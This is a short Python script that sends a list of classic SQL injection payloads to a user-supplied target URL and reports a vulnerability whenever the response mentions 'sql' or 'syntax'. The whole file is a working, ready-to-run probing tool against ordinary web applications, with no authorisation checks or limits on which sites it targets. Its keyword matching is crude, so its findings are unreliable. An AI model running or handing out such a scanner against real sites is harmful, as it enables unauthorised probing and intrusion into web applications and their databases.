import requests

# List of common SQL injection payloads
payloads = ["'", "' OR '1'='1", "' OR 'a'='a", "' OR 1=1--", "' OR 1=1#"]

# Target URL (Make sure it has a vulnerable parameter, e.g., http://example.com/page?id=)
url = input("Enter the target URL with parameter (e.g., http://example.com/page?id=): ")

# Test each payload
for payload in payloads:
    # Append payload to the URL
    test_url = f"{url}{payload}"
    try:
        # Send request
        response = requests.get(test_url)
        
        # Check for vulnerability indicators
        if "sql" in response.text.lower() or "syntax" in response.text.lower():
            print(f"Potential SQL injection vulnerability found with payload: {payload}")
        else:
            print(f"No vulnerability detected with payload: {payload}")
    except requests.RequestException:
        print("Error connecting to target.")

